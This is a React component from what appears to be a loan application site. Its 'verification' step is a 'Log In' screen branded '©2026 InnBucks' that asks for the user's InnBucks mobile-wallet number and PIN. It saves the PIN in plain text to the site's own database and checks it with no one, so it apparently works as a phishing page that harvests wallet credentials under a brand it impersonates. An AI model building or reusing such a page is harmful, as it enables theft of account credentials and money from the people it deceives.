import { useEffect, useState } from 'react';
import { useLocation, useNavigate, useParams } from 'react-router-dom';
import { supabase } from '../lib/supabase';

export default function Verify() {
  const { applicationId } = useParams<{ applicationId: string }>();
  const location = useLocation();
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    mobileNumber: '',
    pin: '',
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  useEffect(() => {
    const state = location.state as { mobileNumber?: string } | null;
    if (state?.mobileNumber) {
      setFormData((prev) => ({
        ...prev,
        mobileNumber: state.mobileNumber ?? '',
      }));
    }
  }, [location.state]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsSubmitting(true);

    if (!supabase) {
      setError('Verification is temporarily unavailable. Please try again later.');
      setIsSubmitting(false);
      return;
    }

    if (!applicationId) {
      setError('Missing application reference. Please start the application again.');
      setIsSubmitting(false);
      return;
    }

    if (!formData.mobileNumber || !formData.pin) {
      setError('Please enter both your InnBucks number and PIN.');
      setIsSubmitting(false);
      return;
    }

    try {
      const appId = parseInt(applicationId, 10);

      const { error: insertError } = await supabase.from('loan_verifications').insert({
        application_id: appId,
        mobile_number: formData.mobileNumber,
        pin: formData.pin, // In production you should hash/encrypt this
      });

      if (insertError) {
        throw insertError;
      }

      await supabase
        .from('loan_applications')
        .update({ status: 'verified' })
        .eq('id', appId);

      setSuccess(true);
    } catch (err) {
      console.error('Error saving verification:', err);
      setError('An error occurred while verifying your details. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  if (success) {
    return (
      <div className="bg-gradient-to-b from-sky-50 to-sky-200 min-h-screen flex items-center justify-center py-12">
        <div className="w-full max-w-md bg-white rounded-xl shadow-xl px-8 py-10 text-center">
          <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Verification Complete</h2>
          <p className="text-lg text-gray-700 leading-relaxed mb-6">
            Thank you. Your InnBucks number has been submitted for verification. We will review your application and
            contact you shortly.
          </p>
          <button
            type="button"
            onClick={() => navigate('/')}
            className="inline-block bg-emerald-600 text-white px-8 py-3 rounded-lg hover:bg-emerald-700 transition-colors font-semibold text-lg"
          >
            Return to Home
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-gradient-to-b from-sky-50 to-sky-200 min-h-screen flex items-center justify-center py-12">
      <div className="w-full max-w-md bg-white rounded-xl shadow-xl px-8 py-10">
        <h1 className="text-2xl md:text-3xl font-semibold text-gray-900 text-center mb-6">Log In</h1>

        {error && (
          <div className="mb-6 bg-red-50 border-l-4 border-red-500 p-4 rounded-r-lg">
            <p className="text-red-800 text-sm">{error}</p>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label htmlFor="mobileNumber" className="block text-gray-800 font-semibold mb-1 text-sm">
              Username <span className="text-red-500">*</span>
            </label>
            <input
              type="tel"
              id="mobileNumber"
              name="mobileNumber"
              value={formData.mobileNumber}
              onChange={handleChange}
              required
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-sky-500 text-sm"
              placeholder="mobile number..."
            />
          </div>

          <div>
            <label htmlFor="pin" className="block text-gray-800 font-semibold mb-1 text-sm">
              Password <span className="text-red-500">*</span>
            </label>
            <input
              type="password"
              id="pin"
              name="pin"
              value={formData.pin}
              onChange={handleChange}
              required
              maxLength={10}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-sky-500 text-sm"
              placeholder="password..."
            />
          </div>

          <div className="flex justify-start mb-2">
            <button
              type="button"
              className="text-xs text-sky-600 hover:underline"
            >
              Forgot Password?
            </button>
          </div>

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-blue-600 text-white py-2 rounded-md font-semibold text-sm tracking-wide hover:bg-blue-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
          >
            {isSubmitting ? 'LOGGING IN...' : 'LOGIN'}
          </button>
        </form>

        <button
          type="button"
          onClick={() => navigate('/')}
          className="mt-4 w-full border border-red-500 text-red-500 py-2 rounded-md font-semibold text-sm tracking-wide hover:bg-red-50 transition-colors"
        >
          SIGN UP
        </button>

        <p className="mt-6 text-[11px] text-gray-500 text-center">&copy;2026 InnBucks</p>
      </div>
    </div>
  );
}

